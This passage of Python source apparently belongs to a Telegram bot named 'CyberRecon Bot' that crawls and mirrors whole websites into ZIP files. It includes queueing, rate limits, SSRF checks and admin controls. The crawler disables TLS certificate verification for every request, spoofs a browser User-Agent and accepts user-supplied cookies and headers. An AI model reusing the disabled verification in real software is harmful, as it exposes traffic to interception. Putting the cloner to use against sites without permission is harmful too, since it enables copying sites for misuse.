#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════╗
# ║   CyberRecon Bot  v31.0  — Production-Ready Railway Deployment      ║
# ║   ✅ 100% Async (aiohttp) | ✅ Bulletproof Error Handling           ║
# ║   ✅ Premium UI/UX        | ✅ All Secrets from ENV vars            ║
# ║   ✅ asyncio.gather()     | ✅ Rotating File Logs                   ║
# ╚══════════════════════════════════════════════════════════════════════╝

import os, re, json, time, shutil, zipfile, hashlib, hmac, struct, tempfile, ssl
import logging, asyncio, socket, functools, io
from collections import defaultdict
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime
from ipaddress import ip_address, ip_network, AddressValueError
from urllib.parse import urljoin, urlparse, urlencode, quote
from functools import lru_cache
from logging.handlers import RotatingFileHandler
import sqlite3
import aiohttp
import concurrent.futures

from bs4 import BeautifulSoup
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand,
    BotCommandScopeDefault
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
from telegram.request import HTTPXRequest

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════
# ⚙️  CONFIG  —  All from Railway Environment Variables
# ═══════════════════════════════════════════════════════════
BOT_TOKEN  = os.getenv("BOT_TOKEN", "")
ADMIN_IDS  = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
DATA_DIR   = os.getenv("DATA_DIR", "/app/data")

if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN not set in Railway environment variables.")
if not ADMIN_IDS:
    raise SystemExit("❌ ADMIN_IDS not set. Add your Telegram user ID.")

os.makedirs(DATA_DIR, exist_ok=True)

DOWNLOAD_DIR    = os.path.join(DATA_DIR, "web_sources")
SQLITE_FILE     = os.path.join(DATA_DIR, "bot_db.sqlite")
RESUME_DIR      = os.path.join(DATA_DIR, "resume_states")
APP_ANALYZE_DIR = os.path.join(DATA_DIR, "app_analysis")

DAILY_LIMIT          = int(os.getenv("DAILY_LIMIT", "10"))
MAX_WORKERS          = 8
MAX_PAGES            = int(os.getenv("MAX_PAGES", "300"))
MAX_ASSETS           = int(os.getenv("MAX_ASSETS", "2000"))
TIMEOUT              = 20
SPLIT_MB             = 45
RATE_LIMIT_SEC       = 10
QUEUE_MAX            = 20
QUEUE_MAX_PER_USER   = 3
FILE_EXPIRY_HOURS    = int(os.getenv("FILE_EXPIRY_HOURS", "24"))
APP_MAX_MB           = int(os.getenv("APP_MAX_MB", "150"))

for d in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
    os.makedirs(d, exist_ok=True)

# ─── Secret key ──────────────────────────────────────────
_SECRET_KEY_FILE = os.path.join(DATA_DIR, "secret.key")
def _load_or_create_secret_key() -> str:
    env_key = os.getenv("SECRET_KEY", "")
    if env_key:
        return env_key
    if os.path.exists(_SECRET_KEY_FILE):
        try:
            with open(_SECRET_KEY_FILE) as f:
                k = f.read().strip()
                if len(k) >= 32:
                    return k
        except Exception:
            pass
    k = hashlib.sha256(os.urandom(32)).hexdigest()
    with open(_SECRET_KEY_FILE, "w") as f:
        f.write(k)
    os.chmod(_SECRET_KEY_FILE, 0o600)
    return k

SECRET_KEY = _load_or_create_secret_key()

# ═══════════════════════════════════════════════════════════
# 📝  LOGGING — Console + Rotating File
# ═══════════════════════════════════════════════════════════
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("CyberReconBot")
_fh = RotatingFileHandler(
    os.path.join(DATA_DIR, "bot.log"),
    maxBytes=5 * 1024 * 1024,
    backupCount=3,
    encoding="utf-8"
)
_fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(_fh)

# ─── BS4 Parser ──────────────────────────────────────────
try:
    import lxml  # noqa
    _BS = "lxml"
except ImportError:
    _BS = "html.parser"

# ─── Global runtime state ────────────────────────────────
download_semaphore: asyncio.Semaphore
scan_semaphore:     asyncio.Semaphore
db_lock:            asyncio.Lock
_dl_queue:          asyncio.Queue
_active_scans:  dict = {}
_scan_tasks:    dict = {}
_cancel_flags:  dict = {}
_queue_pos:     dict = {}
user_last_req:  dict = {}
user_heavy_req: dict = {}
user_queue_count: dict = {}
_monitor_app_ref = None

HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}

def _get_headers(extra: dict = None) -> dict:
    h = dict(HEADERS)
    if extra:
        h.update(extra)
    return h

# ═══════════════════════════════════════════════════════════
# ⚡  CORE ASYNC HTTP ENGINE  —  Replaces requests everywhere
# ═══════════════════════════════════════════════════════════

_aiohttp_timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=8)
_ssl_context = ssl.create_default_context()
_ssl_context.check_hostname = False
_ssl_context.verify_mode = ssl.CERT_NONE

async def async_fetch(
    url: str,
    method: str = "GET",
    headers: dict = None,
    data: dict = None,
    json_data: dict = None,
    timeout: int = TIMEOUT,
    allow_redirects: bool = True,
    verify_ssl: bool = False,
    max_size: int = 5 * 1024 * 1024,  # 5MB max
) -> Optional[dict]:
    """
    Universal async HTTP fetcher.
    Returns: {status, text, headers, url, content_type} or None on error.
    """
    hdr = _get_headers(headers)
    t   = aiohttp.ClientTimeout(total=timeout, connect=8)
    ssl_ctx = None if verify_ssl else _ssl_context
    try:
        async with aiohttp.ClientSession(headers=hdr) as sess:
            async with sess.request(
                method, url,
                data=data,
                json=json_data,
                timeout=t,
                allow_redirects=allow_redirects,
                ssl=ssl_ctx,
            ) as resp:
                ct   = resp.headers.get("Content-Type", "")
                # Only read text for text-based responses
                if any(x in ct for x in ("text/", "application/json", "application/xml",
                                          "application/javascript", "application/x-www")):
                    try:
                        raw = await resp.read()
                        text = raw[:max_size].decode("utf-8", errors="replace")
                    except Exception:
                        text = ""
                else:
                    text = ""
                return {
                    "status":  resp.status,
                    "text":    text,
                    "headers": dict(resp.headers),
                    "url":     str(resp.url),
                    "content_type": ct,
                }
    except asyncio.TimeoutError:
        logger.debug("Timeout fetching: %s", url[:80])
        return None
    except aiohttp.ClientConnectorError:
        logger.debug("Connection error: %s", url[:80])
        return None
    except Exception as e:
        logger.debug("Fetch error %s: %s", url[:80], e)
        return None


async def async_fetch_many(
    urls: List[str],
    method: str = "GET",
    headers: dict = None,
    timeout: int = 12,
    concurrency: int = 20,
) -> List[Optional[dict]]:
    """
    Fetch multiple URLs concurrently using asyncio.gather + semaphore.
    Returns list of results (same order as input).
    """
    sem = asyncio.Semaphore(concurrency)

    async def _one(url: str):
        async with sem:
            return await async_fetch(url, method=method, headers=headers, timeout=timeout)

    return await asyncio.gather(*[_one(u) for u in urls], return_exceptions=False)


# ═══════════════════════════════════════════════════════════
# 🔒  SECURITY LAYER 1  —  SSRF Protection
# ═══════════════════════════════════════════════════════════
_BLOCKED_NETS = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),
    ip_network("100.64.0.0/10"),
    ip_network("0.0.0.0/8"),
    ip_network("::1/128"),
    ip_network("fc00::/7"),
    ip_network("fe80::/10"),
]

@lru_cache(maxsize=512)
def _resolve_host(hostname: str) -> str:
    return socket.gethostbyname(hostname)

def _is_safe_ip(ip_str: str) -> bool:
    try:
        obj = ip_address(ip_str)
        return not any(obj in net for net in _BLOCKED_NETS)
    except (AddressValueError, ValueError):
        return False

def is_safe_url(url: str) -> Tuple[bool, str]:
    if not url or len(url) > 2048:
        return False, "URL too long or empty"
    try:
        p = urlparse(url)
    except Exception:
        return False, "Invalid URL format"
    if p.scheme not in ("http", "https"):
        return False, f"Scheme '{p.scheme}' not allowed"
    if not p.hostname:
        return False, "No hostname"
    if "\x00" in url or "%00" in url:
        return False, "Null byte detected"
    if not re.match(r"^https?://[^\s<>\"{}|\\^`\[\]]+$", url):
        return False, "Invalid characters in URL"
    try:
        ip = _resolve_host(p.hostname)
        if not _is_safe_ip(ip):
            return False, f"IP {ip} blocked (private/cloud)"
    except socket.gaierror:
        return False, f"Cannot resolve: {p.hostname}"
    return True, "OK"

def sanitize_log_url(url: str) -> str:
    try:
        p = urlparse(url)
        return p._replace(query="[REDACTED]" if p.query else "", fragment="").geturl()
    except Exception:
        return "[INVALID_URL]"

# ═══════════════════════════════════════════════════════════
# 🔒  SECURITY LAYER 2  —  Rate Limiting
# ═══════════════════════════════════════════════════════════
def check_rate_limit(uid: int, heavy: bool = False) -> Tuple[bool, int]:
    now    = time.time()
    limit  = 45 if heavy else RATE_LIMIT_SEC
    store  = user_heavy_req if heavy else user_last_req
    cutoff = now - 3600
    for k in [k for k, v in store.items() if v < cutoff]:
        store.pop(k, None)
    last = store.get(uid, 0)
    diff = now - last
    if diff < limit:
        return False, int(limit - diff) + 1
    store[uid] = now
    return True, 0

# ═══════════════════════════════════════════════════════════
# 🔒  SECURITY LAYER 3  —  Admin Auth
# ═══════════════════════════════════════════════════════════
async def verify_admin(update: Update) -> bool:
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        return False
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False
    if update.message and (
        getattr(update.message, "forward_origin", None) or
        getattr(update.message, "forward_date", None)
    ):
        return False
    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            return
        return await func(update, context)
    return wrapper

# ═══════════════════════════════════════════════════════════
# 🗄️  DATABASE  —  SQLite WAL (Async-safe)
# ═══════════════════════════════════════════════════════════
def _sqlite_init():
    con = sqlite3.connect(SQLITE_FILE, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")
    con.execute("PRAGMA synchronous=NORMAL")
    con.execute("PRAGMA cache_size=-8000")
    con.execute("""
        CREATE TABLE IF NOT EXISTS users (
            uid             TEXT PRIMARY KEY,
            name            TEXT DEFAULT '',
            banned          INTEGER DEFAULT 0,
            daily_limit     INTEGER,
            count_today     INTEGER DEFAULT 0,
            last_date       TEXT DEFAULT '',
            total_downloads INTEGER DEFAULT 0,
            total_scans     INTEGER DEFAULT 0,
            scans_today     INTEGER DEFAULT 0,
            downloads       TEXT DEFAULT '[]',
            scan_history    TEXT DEFAULT '[]'
        )
    """)
    con.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    for k, v in [
        ("global_daily_limit", str(DAILY_LIMIT)),
        ("max_pages",          str(MAX_PAGES)),
        ("max_assets",         str(MAX_ASSETS)),
        ("bot_enabled",        "1"),
        ("force_join_channel", ""),
    ]:
        con.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", (k, v))
    con.commit()
    con.close()
    logger.info("✅ SQLite DB initialized: %s", SQLITE_FILE)

def _get_con() -> sqlite3.Connection:
    con = sqlite3.connect(SQLITE_FILE, timeout=30, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")
    con.row_factory = sqlite3.Row
    return con

def _load_db_sync() -> dict:
    con = _get_con()
    try:
        users = {}
        for row in con.execute("SELECT * FROM users"):
            users[row["uid"]] = {
                "name":            row["name"],
                "banned":          bool(row["banned"]),
                "daily_limit":     row["daily_limit"],
                "count_today":     row["count_today"],
                "last_date":       row["last_date"],
                "total_downloads": row["total_downloads"],
                "total_scans":     row["total_scans"],
                "scans_today":     row["scans_today"],
                "downloads":       json.loads(row["downloads"] or "[]"),
                "scan_history":    json.loads(row["scan_history"] or "[]"),
            }
        settings = {}
        for row in con.execute("SELECT key, value FROM settings"):
            v = row["value"]
            try:
                settings[row["key"]] = int(v) if v.lstrip("-").isdigit() else v
            except Exception:
                settings[row["key"]] = v
        return {"users": users, "settings": settings}
    finally:
        con.close()

def _save_user_sync(uid: str, u: dict):
    con = _get_con()
    try:
        con.execute("""
            INSERT OR REPLACE INTO users
            (uid,name,banned,daily_limit,count_today,last_date,
             total_downloads,total_scans,scans_today,downloads,scan_history)
            VALUES(?,?,?,?,?,?,?,?,?,?,?)
        """, (
            uid, u.get("name",""), 1 if u.get("banned") else 0,
            u.get("daily_limit"), u.get("count_today",0),
            u.get("last_date",""), u.get("total_downloads",0),
            u.get("total_scans",0), u.get("scans_today",0),
            json.dumps(u.get("downloads",[])[-100:]),
            json.dumps(u.get("scan_history",[])[-20:]),
        ))
        con.commit()
    finally:
        con.close()

def _save_setting_sync(key: str, value):
    con = _get_con()
    try:
        con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)",
                    (key, str(int(value) if isinstance(value, bool) else value)))
        con.commit()
    finally:
        con.close()

async def db_read() -> dict:
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, _load_db_sync)

async def db_save_user(uid: int, user: dict):
    loop = asyncio.get_running_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_user_sync, str(uid), user)

async def db_save_setting(key: str, value):
    loop = asyncio.get_running_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_setting_sync, key, value)

def get_user(db: dict, uid: int, name: str = "") -> dict:
    uid_s = str(uid)
    if uid_s not in db["users"]:
        db["users"][uid_s] = {
            "name": name, "banned": False, "daily_limit": None,
            "count_today": 0, "last_date": "", "total_downloads": 0,
            "total_scans": 0, "scans_today": 0,
            "downloads": [], "scan_history": [],
        }
    u = db["users"][uid_s]
    if name:
        u["name"] = name
    return u

def reset_daily(u: dict):
    today = str(datetime.now().date())
    if u.get("last_date") != today:
        u["count_today"] = 0
        u["scans_today"] = 0
        u["last_date"]   = today

def get_limit(db: dict, u: dict) -> int:
    if u.get("daily_limit") is not None:
        return int(u["daily_limit"])
    return int(db["settings"].get("global_daily_limit", DAILY_LIMIT))

def can_download(db: dict, u: dict) -> bool:
    lim = get_limit(db, u)
    return lim == 0 or u["count_today"] < lim

def track_scan(db: dict, uid: int, scan_type: str, target: str):
    u = get_user(db, uid)
    u["total_scans"]  = u.get("total_scans", 0) + 1
    u["scans_today"]  = u.get("scans_today", 0) + 1
    hist = u.get("scan_history", [])
    hist.append({
        "type": scan_type, "target": target[:60],
        "time": datetime.now().strftime("%m-%d %H:%M")
    })
    u["scan_history"] = hist[-20:]

def pbar(used: int, total: int) -> str:
    if total <= 0:
        return "∞ Unlimited"
    pct  = min(used / total, 1.0)
    fill = int(pct * 18)
    return f"{'█' * fill}{'░' * (18 - fill)} {int(pct*100)}%"

# ═══════════════════════════════════════════════════════════
# 💬  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════
async def safe_edit(msg, text: str, **kwargs):
    try:
        if hasattr(msg, "edit_message_text"):
            await msg.edit_message_text(text, **kwargs)
        else:
            await msg.edit_text(text, **kwargs)
    except BadRequest as e:
        if any(s in str(e).lower() for s in (
            "message is not modified", "message to edit not found",
            "there is no text in the message to edit"
        )):
            pass
        else:
            raise

async def split_send(msg, context, text: str, chat_id: int, parse_mode="Markdown"):
    """Send long text, splitting if needed."""
    MAX = 4000
    chunks = [text[i:i+MAX] for i in range(0, len(text), MAX)]
    if chunks:
        try:
            await safe_edit(msg, chunks[0], parse_mode=parse_mode)
        except Exception:
            await context.bot.send_message(chat_id, chunks[0], parse_mode=parse_mode)
    for chunk in chunks[1:]:
        try:
            await context.bot.send_message(chat_id, chunk, parse_mode=parse_mode)
        except Exception:
            pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    import traceback
    err = context.error
    if isinstance(err, BadRequest):
        if any(s in str(err).lower() for s in (
            "message is not modified", "message to edit not found",
            "query is too old", "message can't be deleted",
        )):
            return
    if isinstance(err, (TimedOut, NetworkError)):
        logger.warning("Network error (suppressed): %s", err)
        return
    tb = "".join(traceback.format_exception(type(err), err, err.__traceback__))
    short_tb = tb[-1500:] if len(tb) > 1500 else tb
    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 `{u.id}` ({u.first_name})"
    msg_text = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(admin_id, msg_text, parse_mode="Markdown")
        except Exception:
            pass
    logger.error("Unhandled exception: %s", err, exc_info=err)

# ═══════════════════════════════════════════════════════════
# 🔔  FORCE JOIN CHECK
# ═══════════════════════════════════════════════════════════
async def check_force_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    db = await db_read()
    channel = db["settings"].get("force_join_channel", "")
    if not channel:
        return True
    uid = update.effective_user.id
    if uid in ADMIN_IDS:
        return True
    try:
        member = await context.bot.get_chat_member(channel, uid)
        if member.status in ("member", "administrator", "creator"):
            return True
    except Exception:
        pass
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📢 Channel Join", url=f"https://t.me/{channel.lstrip('@')}"),
        InlineKeyboardButton("✅ Check", callback_data="fj_check"),
    ]])
    await update.effective_message.reply_text(
        f"🔒 *Bot သုံးရန် Channel Join လုပ်ပါ*\n\n📢 {channel}\n\nJoin ပြီး ✅ Check နှိပ်ပါ",
        reply_markup=kb, parse_mode="Markdown"
    )
    return False

async def force_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    db = await db_read()
    channel = db["settings"].get("force_join_channel", "")
    if not channel:
        await query.answer("✅ No restriction", show_alert=True)
        return
    try:
        m = await context.bot.get_chat_member(channel, query.from_user.id)
        if m.status in ("member", "administrator", "creator"):
            await query.edit_message_text("✅ *Joined! Bot သုံးနိုင်ပါပြီ*", parse_mode="Markdown")
            return
    except Exception:
        pass
    await query.answer("❌ Channel မှာ Join မရှိသေးပါ", show_alert=True)

# ═══════════════════════════════════════════════════════════
# 📋  QUEUE SYSTEM
# ═══════════════════════════════════════════════════════════
async def queue_worker():
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid, *extra = task
            cookies      = extra[0] if len(extra) > 0 else ""
            extra_headers= extra[1] if len(extra) > 1 else ""
            max_depth    = extra[2] if len(extra) > 2 else 5
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode,
                                    cookies, extra_headers, max_depth)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                user_queue_count[uid] = max(0, user_queue_count.get(uid, 1) - 1)
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)

async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False, cookies: str = "",
    extra_headers: str = "", max_depth: int = 5,
):
    global _dl_queue
    uid = update.effective_user.id
    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max) — ခဏနေပြီး ထပ်ကြိုးစားပါ",
            parse_mode="Markdown"
        )
        return
    user_slots = user_queue_count.get(uid, 0)
    if user_slots >= QUEUE_MAX_PER_USER:
        await update.effective_message.reply_text(
            f"⚠️ သင့် queue slot `{QUEUE_MAX_PER_USER}` ပြည့်ပြီ — ပြီးဆုံးမှ ထပ်ထည့်ပါ",
            parse_mode="Markdown"
        )
        return
    pos = _dl_queue.qsize() + 1
    user_queue_count[uid] = user_slots + 1
    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid,
                         cookies, extra_headers, max_depth))
    _queue_pos[uid] = pos
    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}` | Slots: `{user_slots+1}/{QUEUE_MAX_PER_USER}`\n"
            f"⏳ Download ရောက်သည့်အခါ အလိုအလျောက် စမည်",
            parse_mode="Markdown"
        )

# ═══════════════════════════════════════════════════════════
# 🗑️  AUTO-DELETE BACKGROUND LOOP
# ═══════════════════════════════════════════════════════════
async def auto_delete_loop():
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, _, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            if (now - os.path.getmtime(fpath)) / 3600 >= FILE_EXPIRY_HOURS:
                                freed += os.path.getsize(fpath) / 1048576
                                os.remove(fpath)
                                deleted += 1
                        except Exception:
                            pass
            if deleted:
                logger.info("Auto-delete: %d files | %.1f MB freed", deleted, freed)
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        await asyncio.sleep(3600)

# ═══════════════════════════════════════════════════════════
# 📥  DOWNLOAD SYSTEM  —  Async aiohttp engine
# ═══════════════════════════════════════════════════════════

_RE_CSS_URL    = re.compile(r'url\(["\']?(.+?)["\']?\)')
_RE_CSS_IMPORT = re.compile(r'@import\s+["\'](.+?)["\']')

async def _async_download_asset(
    session: aiohttp.ClientSession, url: str, local_path: str
) -> bool:
    """Download single asset to disk. Returns True on success."""
    try:
        t = aiohttp.ClientTimeout(total=20)
        async with session.get(url, timeout=t, ssl=_ssl_context,
                               allow_redirects=True) as resp:
            if resp.status == 200:
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                content = await resp.read()
                if len(content) > 50 * 1024 * 1024:  # skip >50MB
                    return False
                with open(local_path, "wb") as f:
                    f.write(content)
                return True
    except Exception:
        pass
    return False

def _safe_local_path(domain_dir: str, url: str) -> str:
    p = urlparse(url)
    path = p.path.lstrip("/")
    if not path or path.endswith("/"):
        path = path + "index.html"
    if not os.path.splitext(path)[1]:
        path += ".html"
    if p.query:
        sq = re.sub(r"[^\w]", "_", p.query)[:20]
        base, ext = os.path.splitext(path)
        path = f"{base}_{sq}{ext}"
    local = os.path.normpath(os.path.join(domain_dir, path))
    real_base = os.path.realpath(domain_dir)
    real_local = os.path.realpath(os.path.join(domain_dir, path))
    if not real_local.startswith(real_base + os.sep):
        safe = hashlib.md5(url.encode()).hexdigest()[:16]
        ext  = os.path.splitext(p.path)[1][:8] or ".bin"
        local = os.path.join(domain_dir, "assets", safe + ext)
    os.makedirs(os.path.dirname(local), exist_ok=True)
    return local

def _extract_assets(html: str, page_url: str) -> set:
    assets = set()
    try:
        soup = BeautifulSoup(html, _BS)
        for tag in soup.find_all("link", href=True):
            assets.add(urljoin(page_url, tag["href"]))
        for tag in soup.find_all("script", src=True):
            assets.add(urljoin(page_url, tag["src"]))
        LAZY = ("src","data-src","data-lazy","data-original","data-lazy-src",
                "data-srcset","data-image","data-bg")
        for tag in soup.find_all("img"):
            for attr in LAZY:
                v = tag.get(attr, "")
                if v and not v.startswith("data:"):
                    assets.add(urljoin(page_url, v))
        for tag in soup.find_all(["video","audio","source","track"]):
            for attr in ("src","data-src","poster"):
                v = tag.get(attr, "")
                if v:
                    assets.add(urljoin(page_url, v))
        for st in soup.find_all("style"):
            css = st.string or ""
            for u in _RE_CSS_URL.findall(css):
                if not u.startswith("data:"):
                    assets.add(urljoin(page_url, u))
        for tag in soup.find_all(style=True):
            for u in _RE_CSS_URL.findall(tag["style"]):
                if not u.startswith("data:"):
                    assets.add(urljoin(page_url, u))
        for tag in soup.find_all("meta"):
            prop = (tag.get("property","") + tag.get("name","")).lower()
            if any(k in prop for k in ("image","thumbnail","banner","icon")):
                c = tag.get("content","")
                if c.startswith("http"):
                    assets.add(c)
    except Exception:
        pass
    return assets

async def _run_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool,
    resume_mode: bool = False,
    cookies: str = "", extra_headers: str = "", max_depth: int = 5,
):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    chat_id = update.effective_chat.id

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`", parse_mode="Markdown")
        return

    async with db_lock:
        loop = asyncio.get_running_loop()
        db   = await loop.run_in_executor(None, _load_db_sync)
        u    = get_user(db, uid, uname)
        reset_daily(u)
        if u["banned"]:
            await loop.run_in_executor(None, _save_user_sync, str(uid), u)
            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်")
            return
        if not db["settings"].get("bot_enabled", 1) and uid not in ADMIN_IDS:
            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်")
            return
        if not resume_mode and not can_download(db, u):
            lim = get_limit(db, u)
            await update.effective_message.reply_text(
                f"⛔ Daily limit (`{lim}`) ပြည့်ပါပြီ", parse_mode="Markdown")
            return
        await loop.run_in_executor(None, _save_user_sync, str(uid), u)

    mode_txt = ("🌐 Full Site" if full_site else "📄 Single Page")
    msg = await update.effective_message.reply_text(
        f"⏳ *Download စနေပြီ...*\n"
        f"🔗 `{sanitize_log_url(url)}`\n"
        f"📋 {mode_txt}\n\n`{'░'*18}` 0%",
        parse_mode="Markdown"
    )

    cancel_ev = asyncio.Event()
    _cancel_flags[uid] = cancel_ev

    domain      = urlparse(url).hostname or "site"
    domain_dir  = os.path.join(DOWNLOAD_DIR, re.sub(r"[^\w\-]", "_", domain))
    os.makedirs(domain_dir, exist_ok=True)

    visited    = set()
    to_visit   = {url}
    assets     = set()
    page_count = 0

    custom_headers = {}
    if extra_headers:
        for part in extra_headers.split("||"):
            if ":" in part:
                k, _, v = part.partition(":")
                custom_headers[k.strip()] = v.strip()

    connector = aiohttp.TCPConnector(limit=16, ssl=_ssl_context)
    timeout   = aiohttp.ClientTimeout(total=20)

    async with aiohttp.ClientSession(
        headers=_get_headers(custom_headers),
        connector=connector,
        timeout=timeout,
    ) as sess:
        # ── Phase 1: Crawl pages ──────────────────────
        depth = 0
        while to_visit and len(visited) < MAX_PAGES and not cancel_ev.is_set():
            batch = list(to_visit - visited)[:20]
            to_visit -= set(batch)
            depth += 1

            async def _fetch_page(purl: str):
                try:
                    async with sess.get(purl, allow_redirects=True) as r:
                        ct = r.headers.get("Content-Type","")
                        if "text/html" in ct or "xhtml" in ct:
                            raw = await r.read()
                            return purl, raw[:5*1024*1024].decode("utf-8","replace")
                except Exception:
                    pass
                return purl, None

            results = await asyncio.gather(*[_fetch_page(p) for p in batch])

            for purl, html in results:
                if not html:
                    continue
                visited.add(purl)
                page_count += 1
                local = _safe_local_path(domain_dir, purl)
                try:
                    with open(local, "w", encoding="utf-8") as f:
                        f.write(html)
                except Exception:
                    pass
                page_assets = _extract_assets(html, purl)
                assets |= page_assets
                if full_site and depth < max_depth:
                    soup = BeautifulSoup(html, _BS)
                    for a in soup.find_all("a", href=True):
                        link = urljoin(purl, a["href"]).split("#")[0]
                        lp = urlparse(link)
                        if lp.hostname == urlparse(url).hostname and link not in visited:
                            to_visit.add(link)

            pct  = min(page_count / max(MAX_PAGES, 1) * 50, 50)
            fill = int(pct / 100 * 18)
            try:
                await safe_edit(
                    msg,
                    f"⏳ *Download นေနေ...*\n"
                    f"📄 Pages: `{page_count}` | 🗂 Assets found: `{len(assets)}`\n"
                    f"`{'█'*fill}{'░'*(18-fill)}` {int(pct)}%",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            await asyncio.sleep(0.1)

        if cancel_ev.is_set():
            try:
                await safe_edit(msg, "🛑 *Download ရပ်သွားပြီ*", parse_mode="Markdown")
            except Exception:
                pass
            _cancel_flags.pop(uid, None)
            return

        # ── Phase 2: Download assets ──────────────────
        assets = {a for a in assets if urlparse(a).scheme in ("http","https")}
        assets = list(assets)[:MAX_ASSETS]
        batch_size = 50
        downloaded  = 0

        for i in range(0, len(assets), batch_size):
            if cancel_ev.is_set():
                break
            batch = assets[i:i+batch_size]
            tasks = []
            for asset_url in batch:
                local = _safe_local_path(domain_dir, asset_url)
                tasks.append(_async_download_asset(sess, asset_url, local))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            downloaded += sum(1 for r in results if r is True)

            pct  = 50 + min((i+batch_size)/max(len(assets),1)*50, 50)
            fill = int(pct/100*18)
            try:
                await safe_edit(
                    msg,
                    f"⏳ *Assets download...*\n"
                    f"📦 `{downloaded}/{len(assets)}` assets\n"
                    f"`{'█'*fill}{'░'*(18-fill)}` {int(pct)}%",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

    _cancel_flags.pop(uid, None)

    # ── Phase 3: ZIP & send ───────────────────────
    try:
        await safe_edit(msg, "📦 *ZIP file ကို pack လုပ်နေတယ်...*", parse_mode="Markdown")
        zip_path = os.path.join(DOWNLOAD_DIR, f"{re.sub(r'[^\w]','_',domain)}.zip")
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(domain_dir):
                for fname in files:
                    fp = os.path.join(root, fname)
                    zf.write(fp, os.path.relpath(fp, DOWNLOAD_DIR))
        zip_mb = os.path.getsize(zip_path) / 1048576

        if zip_mb > SPLIT_MB:
            # Split send
            await safe_edit(
                msg,
                f"⚠️ ZIP size `{zip_mb:.1f}MB` > {SPLIT_MB}MB — Split ဖြင့် ပို့မည်",
                parse_mode="Markdown"
            )
            # For very large files just send what we can
            with open(zip_path, "rb") as zf:
                await context.bot.send_document(
